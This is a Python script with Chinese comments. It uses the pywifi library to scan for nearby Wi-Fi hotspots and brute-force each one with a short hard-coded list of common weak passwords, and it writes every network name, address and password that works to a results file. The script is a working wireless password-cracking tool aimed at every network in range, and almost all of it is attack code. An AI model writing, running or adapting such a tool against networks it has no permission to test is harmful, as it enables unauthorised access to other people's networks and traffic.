#!/usr/bin/python3
# coding: utf-8
from pywifi import *
import time
import sys
def scans(face, timeout):
    face.scan()  # 开始扫描
    time.sleep(timeout)
    return face.scan_results()  # 在若干秒后获取扫描结果
def test(i, face, x, key, stu, ts):
    showID = x.bssid if len(x.ssid)>len(x.bssid) else x.ssid  # 显示对应网络名称, 考虑到部分中文名啧显示bssid
    for n,k in enumerate(key):  # 迭代字典并进行爆破
        x.key = k.strip()
        face.remove_all_network_profiles()  # 移除所有热点配置
        face.connect(face.add_network_profile(x))  # 将封装好的目标尝试连接
        code = 10  # 初始化状态码, 考虑到用 0 会发生些逻辑错误
        t1 = time.time()
        while code != 0:  # 循环刷新状态, 如果置为 0 则密码错误, 如超时则进行下一个
            time.sleep(0.1)
            code = face.status()
            now = time.time()-t1
            if now>ts:
                break
            stu.write("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s" % (6, i, 18, showID, code, 5, now, 7, x.signal, 10,len(key)-n,10,k.replace("\n","")))
            stu.flush()
            if code == 4:
                face.disconnect()
                return "%-*s| %s | %*s |%*s\n"%(20,x.ssid,x.bssid,3,x.signal,15,k)
    return False
def main():
    scantimes, testtimes = 3, 15  # 扫描时常; 单个密码测试延迟, 延迟越大, 信号越弱
    output = sys.stdout
    files = "TestRes.txt"  # 结果文件保存路径
    # keys = open('./tmp').readlines()  # 字典列表
    keys = [12345678, 123456789, 88888888, 1234567890, 00000000, 87654321, 66668888, 11223344, 147258369, 11111111]
    for i in range(len(keys)): keys[i] = str(keys[i])
    print("|KEYS %s" % (len(keys)))
    wifi = PyWiFi()  # 实例化一个 pywifi 对象
    iface = wifi.interfaces()[0]  # 选择定一个网卡并赋值于 iface
    scanres = scans(iface, scantimes)  # 通过 iface 进行一个时常为 scantimes 的扫描并获取附近的热点基础配置
    nums = len(scanres)  # 统计附近被发现的热点数量
    print("|SCAN GET %s"%(nums))
    print("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s"%("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70))
    for i,x in enumerate(scanres):  # 将每一个热点信息逐一进行测试
        res = test(nums-i, iface, x, keys, output, testtimes)  # 测试完毕后, 成功的结果讲存储到files中
        if res:
            open(files,"a").write(res)
# 这里显示本次测试使用了11个弱口令，并扫描到了20个热点，然后开始坑爹的跑起来了
# WIFIID 热点的id号 每跑一个会减1
# SSID OR BSSID 热点的ssid名或mac地址
# N 对热点的连接状态，这个在
# time 当前所花去的时间
# signal 热点的信号强度，若小越好
# KEYNUM 测试密码的id 每跑一个会减1
# KEY 当前测试的密码
if __name__ == '__main__':
    # wifi = PyWiFi()
    # print(wifi.interfaces()[0])
    main()
